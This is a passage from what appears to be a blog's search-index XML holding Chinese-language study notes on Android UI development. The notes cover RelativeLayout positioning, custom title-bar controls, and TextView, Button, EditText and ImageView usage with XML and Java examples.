alt="image-20200922201421666"></p><p>上面控件都是相对于父布局进行定位，同时控件可以相对于控件进行一个定位</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/button1&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">&quot;按钮1&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_above</span>=<span class="string">&quot;@id/button5&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_toLeftOf</span>=<span class="string">&quot;@id/button5&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/button2&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">&quot;按钮2&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_above</span>=<span class="string">&quot;@id/button5&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_toRightOf</span>=<span class="string">&quot;@id/button5&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/button3&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">&quot;按钮3&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_below</span>=<span class="string">&quot;@id/button5&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_toLeftOf</span>=<span class="string">&quot;@id/button5&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/button4&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">&quot;按钮4&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_below</span>=<span class="string">&quot;@id/button5&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_toRightOf</span>=<span class="string">&quot;@id/button5&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/button5&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">&quot;按钮5&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_centerInParent</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">  /&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922201930839.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922201930839.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922201930839"></p><p> <code>android:layout_above=&quot;@id/button5&quot;</code>使得该控件位于button5上方</p><p> <code>android:layout_below=&quot;@id/button5&quot;</code>使得该控件位于button5下方</p><p><code>android:layout_toLeftOf=&quot;@id/button5&quot;</code>使得该控件位于button5左侧</p><p><code>android:layout_toRightOf=&quot;@id/button5&quot;</code>使得该控件位于button5右侧</p><p><img src="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922202137466.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922202137466.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922202137466"></p><h2 id="3-帧布局"><a href="#3-帧布局" class="headerlink" title="3.帧布局"></a>3.帧布局</h2><p>FrameLayout所有的控件都会默认摆放在布局的左上角</p><h2 id="4-百分比布局"><a href="#4-百分比布局" class="headerlink" title="4.百分比布局"></a>4.百分比布局</h2><p>PrecentFrameLayout 和PrecentRelativeLayout两个布局</p><p>需要在项目的build.gradle中添加百分比布局的依赖，就能保证百分比布局在Android所有系统版本上的兼容性</p><h2 id="5-引入布局"><a href="#5-引入布局" class="headerlink" title="5.引入布局"></a>5.引入布局</h2><p>在一个布局中引入替他布局 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">include</span> <span class="attr">layout</span>=<span class="string">&quot;@layout/titile&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="6-创建自定义控件"><a href="#6-创建自定义控件" class="headerlink" title="6.创建自定义控件"></a>6.创建自定义控件</h2><p>引入布局文件确实解决了重复编写布局代码的问题，但是如果布局中有一些控件要求能够响应时间，我们还是需要在每一个活动中为这些控件单独编写一次事件注册代码，比如标题栏中的返回按钮，其实不管在哪一个活动中，这个按钮的功能都是相同的，即销毁当前活动，而如果在每一次活动中都需要重新注册一遍返回按钮的点击事件，无疑会增加很多重复的代码，这种情况最好是使用自定义控件的方式进行解决。</p><p>新建TitleLayout这和类继承自LinearLayout，让其成为我们自定义的标题栏控件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TitleLayout</span> <span class="keyword">extends</span> <span class="title">LinearLayout</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">TitleLayout</span><span class="params">(Context context, AttributeSet attrs)</span></span>&#123;</span><br><span class="line">     <span class="keyword">super</span>(context,attrs);</span><br><span class="line">     LayoutInflater.from(context).inflate(R.layout.titile,<span class="keyword">this</span>);</span><br><span class="line">     </span><br><span class="line">     Button titileBack=(Button) findViewById(R.id.title_bcak);</span><br><span class="line">     Button titileEdit=(Button) findViewById(R.id.title_edit);</span><br><span class="line">     titileBack.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">         <span class="meta">@Override</span></span><br><span class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">             ((Activity)getContext()).finish();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;);</span><br><span class="line">    titileEdit.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            Toast.makeText(getContext(),<span class="string">&quot;你正在点击编辑键&quot;</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重写了构造函数，<code>public TitleLayout(Context context, AttributeSet attrs)</code>，在布局中引入该控件就会调用这个构造函数。然后在构造函数中需要对标题栏布局进行动态加载，需要语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LayoutInflater.from(context).inflate(R.layout.titile,<span class="keyword">this</span>);</span><br></pre></td></tr></table></figure><p>通过LayoutIlater的from( )方法可以构建出一个LayoutInflater对象，然后调用inflate( )方法就可以动态加载一个布局文件。</p><p><code>inflate( )</code>方法有两个参数，一个参数是传入布局文件的id，另一个是给加载好得布局再添加一个父布局，由于这个要指定TitleLayout，于是直接传入this</p><p>在activity_main.xml加入自定义的控件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.example.uiwidgettest.TitleLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-控件使用</title>
      <link href="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="TextView"><a href="#TextView" class="headerlink" title="TextView"></a>TextView</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;床前明月光&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:gravity</span>=<span class="string">&quot;center&quot;</span> /&gt;</span>         </span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>android:layout_width</code> <code>android:layout_height</code>指定了控件的宽度和高度</p><p>所有的Android控件都具有这两个属性，可选值有match_parent、fill_parent、wrap_content</p><p>其中<code>match_parent</code>和<code>fill_parent</code>的意义相同，都是让控件的大小和父布局的大小一样</p><p><code>wrap_content</code>表示当前的控件的大小刚好能够包含住里面的内容，就是由控件的内容决定当前控件的大小</p><p><code>android:gravity</code>用来指定文字的对其方式，可选值有<code>top</code>、<code>bottom</code>、<code>left</code>、<code>right</code>、<code>center</code>可以用|来指定多个值。</p><p>这里的center，效果等同于center_vertical|center_horizontal，表示文字在垂直和水平方向都居中对齐</p><p><img src="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922140337088.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922140337088.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922140337088"></p><p>同时可以用<code>android:textSize</code>和<code>android:textColor</code>属性对字体的大小和颜色进行更改，字体大小用sp作为单位</p><h1 id="Button"><a href="#Button" class="headerlink" title="Button"></a>Button</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;button&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center&quot;</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到其中<img src="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922150332714.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922150332714.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922150332714"></p><p>text代码中式button，到了按钮中就变为BUTTON，可以通过<code>android:textALLCap=“false”</code>去取消大写</p><p>在java为按钮添加点击事件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    Button button1=(Button) findViewById(R.id.button1);</span><br><span class="line">    button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">&quot;你按下了这个按钮&quot;</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到为Button1的点击事件注册一个监听器，每次点击按钮，都会执行监听器的onClick( )方法，只需要在这个方法加入处理的逻辑</p><p>也可以通过实现接口的方法来进行注册，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button button1=(Button) findViewById(R.id.button1);</span><br><span class="line">        button1.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId())&#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.button1:</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">&quot;你点了这个按钮&quot;</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="EditText"><a href="#EditText" class="headerlink" title="EditText"></a>EditText</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:text</span>=<span class="string">&quot;这是一个标签&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/text_view&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;button&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/edit_text&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922152702696.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922152702696.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922152702696"></p><p>可以使用<code>android:hint=&quot;输入一些东西&quot;</code>在编辑框上显示文字</p><p>开业通过<code>android:maxLines</code>控制显示的行数<img src="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922153036431.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922153036431.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922153036431"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    Button button1=(Button) findViewById(R.id.button1);</span><br><span class="line">    <span class="keyword">final</span> EditText editText=(EditText)findViewById(R.id.edit_text);</span><br><span class="line">    button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            String data=editText.getText().toString();</span><br><span class="line">  Toast.makeText(MainActivity.<span class="keyword">this</span>,data,Toast.LENGTH_LONG).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>从编辑框获得文本后，用Toast展示出来</strong></p><h1 id="lt-LinearLayout-gt"><a href="#lt-LinearLayout-gt" class="headerlink" title="&lt;LinearLayout&gt;"></a>&lt;LinearLayout&gt;</h1><p>在这个标签内进行一个线性排列，要记得加入一个<code>android:orientation=&quot;vertical&quot;</code>这样的话是垂直排列下来</p><h1 id="ImageView"><a href="#ImageView" class="headerlink" title="ImageView"></a>ImageView</h1><p>该控件主要用于界面上展示图片，图片一般都是放在drawable开头的目录下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/image_view&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:src</span>=<span class="string">&quot;@drawable/img_1&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922160139628.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922160139628.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922160139628"></p><p><img src="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922160212475.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922160212475.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922160212475"></p><p>通过按钮动态修改图片</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    Button button1=(Button) findViewById(R.id.button1);</span><br><span class="line">    <span class="keyword">final</span> EditText editText=(EditText)findViewById(R.id.edit_text);</span><br><span 